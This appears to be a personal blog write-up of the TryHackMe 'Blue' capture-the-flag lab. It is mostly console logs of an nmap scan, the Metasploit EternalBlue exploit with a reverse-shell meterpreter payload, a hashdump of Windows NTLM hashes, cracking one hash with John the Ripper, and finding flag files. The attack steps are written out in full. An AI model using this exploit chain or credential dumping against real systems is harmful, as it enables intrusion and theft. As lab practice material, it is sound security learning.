@@ -1,0 +1,305 @@
+---
+layout: post
+title:  "THM: Bluer"
+date:   2024-02-07 18:50:01 -0600
+categories: TryHackMe
+image: /assets/img/blue.jpg
+---
+Initial nmap scan
+```
+root@ip-10-10-156-21:~# nmap -sV 10.10.231.240
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-02-08 02:10 GMT
+Nmap scan report for ip-10-10-231-240.eu-west-1.compute.internal (10.10.231.240)
+Host is up (0.00049s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49159/tcp open  msrpc         Microsoft Windows RPC
+MAC Address: 02:05:3B:98:9D:69 (Unknown)
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 118.78 seconds
+
+```
+
+When I got to task #2, the hint says Google this: shell_to_meterpreter
+I did that and got to here [Upgrading shells to Meterpreter] (https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)
+
+To upgrade the most recently opened session to Meterpreter using the sessions command:
+```
+sessions -u -1
+```
+However after I did that I got to the same position he had, so I'm not sure if that was done correctly
+
+```
+msf6 > search windows blue
+
+Matching Modules
+================
+
+   #   Name                                                  Disclosure Date  Rank       Check  Description
+   -   ----                                                  ---------------  ----       -----  -----------
+   0   exploit/windows/http/badblue_ext_overflow             2003-04-20       great      Yes    BadBlue 2.5 EXT.dll Buffer Overflow
+   1   exploit/windows/http/badblue_passthru                 2007-12-10       great      No     BadBlue 2.72b PassThru Buffer Overflow
+   2   exploit/windows/misc/bcaaa_bof                        2011-04-04       good       No     Blue Coat Authentication and Authorization Agent (BCAAA) 5 Buffer Overflow
+   3   exploit/windows/proxy/bluecoat_winproxy_host          2005-01-05       great      No     Blue Coat WinProxy Host Header Overflow
+   4   exploit/windows/rdp/cve_2019_0708_bluekeep_rce        2019-05-14       manual     Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
+   5   exploit/windows/ftp/easyftp_mkd_fixret                2010-04-04       great      Yes    EasyFTP Server MKD Command Stack Buffer Overflow
+   6   post/windows/manage/install_ssh                                        normal     No     Install OpenSSH for Windows
+   7   post/windows/manage/install_python                                     normal     No     Install Python for Windows
+   8   exploit/windows/local/bthpan                          2014-07-18       average    Yes    MS14-062 Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
+   9   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   10  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   12  exploit/windows/fileformat/word_msdtjs_rce            2022-05-29       excellent  No     Microsoft Office Word MSDTJS
+   13  exploit/windows/smb/smb_doublepulsar_rce              2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
+   14  exploit/windows/local/cve_2020_0796_smbghost          2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow
+   15  exploit/windows/smb/cve_2020_0796_smbghost            2020-03-13       average    Yes    SMBv3 Compression Buffer Overflow
+   16  exploit/windows/misc/trendmicro_cmdprocessor_addtask  2011-12-07       good       No     TrendMicro Control Manger CmdProcessor.exe Stack Buffer Overflow
+
+
+Interact with a module by name or index. For example info 16, use 16 or use exploit/windows/misc/trendmicro_cmdprocessor_addtask
+
+msf6 > use 9
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://d
+                                             ocs.metasploit.com/docs/using-met
+                                             asploit/basics/using-metasploit.h
+                                             tml
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to
+                                             use for authentication. Only affe
+                                             cts Windows Server 2008 R2, Windo
+                                             ws 7, Windows Embedded Standard 7
+                                              target machines.
+   SMBPass                         no        (Optional) The password for the s
+                                             pecified username
+   SMBUser                         no        (Optional) The username to authen
+                                             ticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matc
+                                             hes exploit Target. Only affects
+                                             Windows Server 2008 R2, Windows 7
+                                             , Windows Embedded Standard 7 tar
+                                             get machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploi
+                                             t Target. Only affects Windows Se
+                                             rver 2008 R2, Windows 7, Windows
+                                             Embedded Standard 7 target machin
+                                             es.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
+                                        ead, process, none)
+   LHOST     10.10.156.21     yes       The listen address (an interface may b
+                                        e specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.231.240
+RHOSTS => 10.10.231.240
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+[*] Started reverse TCP handler on 10.10.156.21:4444 
+[*] 10.10.231.240:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.231.240:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.231.240:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.231.240:445 - The target is vulnerable.
+[*] 10.10.231.240:445 - Connecting to target for exploitation.
+[+] 10.10.231.240:445 - Connection established for exploitation.
+[+] 10.10.231.240:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.231.240:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.231.240:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.231.240:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.231.240:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.231.240:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.231.240:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.231.240:445 - Sending all but last fragment of exploit packet
+[*] 10.10.231.240:445 - Starting non-paged pool grooming
+[+] 10.10.231.240:445 - Sending SMBv2 buffers
+[+] 10.10.231.240:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.231.240:445 - Sending final SMBv2 buffers.
+[*] 10.10.231.240:445 - Sending last fragment of exploit packet!
+[*] 10.10.231.240:445 - Receiving response from exploit packet
+[+] 10.10.231.240:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.231.240:445 - Sending egg to corrupted connection.
+[*] 10.10.231.240:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200774 bytes) to 10.10.231.240
+[*] Meterpreter session 1 opened (10.10.156.21:4444 -> 10.10.231.240:49179) at 2024-02-08 02:15:52 +0000
+[+] 10.10.231.240:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.231.240:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.231.240:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+meterpreter > 
+Background session 1? [y/N]  y
+[-] Unknown command: y
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -u -1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.156.21:4433 
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+[*] Sending stage (200774 bytes) to 10.10.231.240
+[*] Meterpreter session 2 opened (10.10.156.21:4433 -> 10.10.231.240:49183) at 2024-02-08 02:18:37 +0000
+[*] Stopping exploit/multi/handler
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.156.21:4444 -> 10.10.231.240:49179 (10.10.231.240)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.156.21:4433 -> 10.10.231.240:49183 (10.10.231.240)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 2032 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>^Z
+Background channel 1? [y/N]  y
+
+```
+About here I wanted to listen to what he thought the migrate process and he uses the printer
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 428   664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 476   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 568   560   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 616   560   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 624   608   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 664   608   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 712   616   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 720   616   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 728   616   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 780   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 836   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 868   568   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1076  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1160  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1308  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1344  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1420  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1484  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1632  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1952  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2032  3044  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
+ 2052  2380  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2068  836   WmiPrvSE.exe
+ 2380  712   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2528  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2576  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+ 2676  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2684  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 2772  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+ 2980  568   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 3044  2276  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 3064  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+
+meterpreter > migrate 1308
+[*] Migrating from 3044 to 1308...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+Time to run hashdump
+```
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+I did my crack from crackstation, but figured I'd also learn how to do it from John the ripper
+
+```
+oot@ip-10-10-156-21:~# echo 'Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+> 
+> ' > jon.hash
+root@ip-10-10-156-21:~# ls
+CTFBuilder  Desktop  Downloads  Instructions  jon.hash  Pictures  Postman  Rooms  Scripts  thinclient_drives  Tools
+root@ip-10-10-156-21:~# cat jon.hash
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+root@ip-10-10-156-21:~# john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+{redacted}         (Jon)
+1g 0:00:00:01 DONE (2024-02-08 02:45) 0.9803g/s 10000Kp/s 10000Kc/s 10000KC/s alr1979..alpus
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+
+```
+interesting you can run the --show
+```
+root@ip-10-10-156-21:~# john jon.hash --format=NT --show
+Jon:{redacted}:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+I thought he was crazy in the solution video where he looks for each flag rather than just using search
+```
+meterpreter > search -f flag*.txt
+Found 3 results...
+==================
+
+Path                                  Size (bytes)  Modified (UTC)
+----                                  ------------  --------------
+c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 19:26:36 +0000
+c:\Windows\System32\config\flag2.txt  34            2019-03-17 19:32:48 +0000
+c:\flag1.txt                          24            2019-03-17 19:27:21 +0000
+
+meterpreter > cat 'c:\Windows\System32\config\flag2.txt'
+flag{redacted}meterpreter > 
+meterpreter > cat 'c:\Users\Jon\Documents\flag3.txt'
+``` 
+It was a fun room and again, did most about 80% so maybe I am getting there!
